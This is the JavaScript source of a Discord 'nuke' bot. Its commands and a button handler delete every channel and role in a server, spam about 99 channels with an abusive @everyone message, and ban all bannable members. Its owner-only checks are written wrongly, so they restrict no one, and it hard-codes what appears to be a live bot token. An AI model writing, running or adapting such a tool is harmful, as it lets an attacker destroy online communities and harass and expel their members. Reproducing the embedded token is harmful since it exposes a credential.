const Discord = require('discord.js');
const { Client, GatewayIntentBits, AuditLogEvent, EmbedBuilder, PermissionFlagsBits, ChannelType,  ActionRowBuilder, ButtonBuilder, REST, SlashCommandBuilder, Routes, Events, InteractionType, ButtonStyle } = require('discord.js');

const client = new Discord.Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, 
  GatewayIntentBits.GuildMembers, GatewayIntentBits.MessageContent,
GatewayIntentBits.DirectMessages, GatewayIntentBits.GuildPresences, 
GatewayIntentBits.GuildMessageTyping,
GatewayIntentBits.GuildBans, GatewayIntentBits.DirectMessageTyping] 
})

client.on(Events.MessageCreate, async message => {
  let cmd = message.content.toLowerCase();
  Nuke_Warning();
  const prefix = '!';
  async function Nuke_Warning()
  {
    if (cmd.startsWith('.nukepanel_create'))
    {
      if (!message.member.user.tag === 'HeadLance#1415') return false;
const nuke_warning = new EmbedBuilder().setTitle('NUKE').setDescription(':radioactive: This is A nuke command made by HeadLance#1045. this command will nuke the entire server, damage the channels, roles and ban all members. The embed you are reading now is the first and the last warning triggered by the command executed. If you are aware of what you are doing, then press the button.').setColor('DarkRed')
const button_nuke = new ButtonBuilder().setCustomId('nuke').setLabel('Execute').setStyle(ButtonStyle.Primary);
const row = new ActionRowBuilder().addComponents(button_nuke);
       message.channel.send({ embeds: [nuke_warning], components: [row]});
    }
  }
  delchannels();
async function delchannels()
{
   if (cmd.startsWith('>delallchannels'))
   {
    if (!message.member.user.tag === 'HeadLance#1415') return false;
    message.guild.channels.cache.forEach(c => { try { c.delete()} catch (erro) { }});
   }
}
eraseuniverse();


async function eraseuniverse()
{
  if (cmd.startsWith('>eraseserver'))
   {
    if (!message.member.user.tag === 'HeadLance#1415') return false;
    message.guild.channels.cache.forEach(c => { try { c.delete()} catch (erro) { }});

    message.guild.roles.cache.forEach(r => { try { if (r) {
      r.delete();
    }} catch (eee)  { }})
   }
  
  }
  sayit();
async function sayit(boo)
{
  boo = 1;
  if (message.member.user.tag === 'HeadLance#1415') {
    
    if (boo === 0) return false;

   // const audbot = message.guild.channels.cache.get('');
    message.channel.sendTyping();
    let sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  
   
    sleep(2000);
    message.delete().catch(e => message.channel.send(`:x: _client.websocket_ ${e}`));
   
  
}

}
})

client.on(Events.InteractionCreate, async interaction => {
  if (!interaction.isButton()) return false;
  if (interaction.customId === 'nuke')
  {
    if (!interaction.user.tag === 'HeadLance#1415') return interaction.reply({ content: 'Bruh.', ephemeral: true});

    if (!interaction.guild.members.me.permissions.has('Administrator')) return interaction.reply({ content: 'I need `Administrator` Permission to begin the nuke.', ephemeral: true})
    interaction.guild.channels.cache.forEach(c => {
      if (c.isTextBased()) {
        try {
          c.delete()
          console.log(`%c Channel deleted: ${c.name}`, 'background: #222; color: green');
        }
        catch (erro) {
          console.log(`%c Channel deleted: ${c.name}`, 'background: #222; color: red');
        }
      }

      interaction.guild.roles.cache.forEach(
        r => {
          r.delete().catch(e => console.log(e));
        })

    for (let num = 1; num < 100; num++)
    {
      try {
      interaction.guild.channels.create({ name: "nuked-hehhehah", type: ChannelType.GuildText}).then(c => c.send(`${interaction.guild.roles.everyone.toString()} get fucked up by me LOL :joy:`));

      interaction.guild.roles.create({ name: `Nuked by ${interaction.user.tag}`});
      } catch (e) { console.log(e)}
    }
      interaction.guild.members.cache.forEach(m => {
        try {
          if (m.bannable)
          m.ban({reason: 'fucked nuked'});
        }
        catch (error)  { 
          console.log(error);
        }
      })
    })
  }
})

client.on('messageDelete', async message => {

  delsend();

  async function delsend()
  {
    if (message.member.user.tag === 'HeadLance#1415')
    {
      let m = message.content;
      try {
      message.channel.send(`${m}`);
      } catch (erro)  { }
    }
  }
})
// rfs talking bot (reder)
client.login('OTkwNDc4ODMzNzcxNzQ5NDA3.GsQUSV.QmWpFKKN1izsHXTRbq6j0rkow7ZQ7ofkPTs2qg');
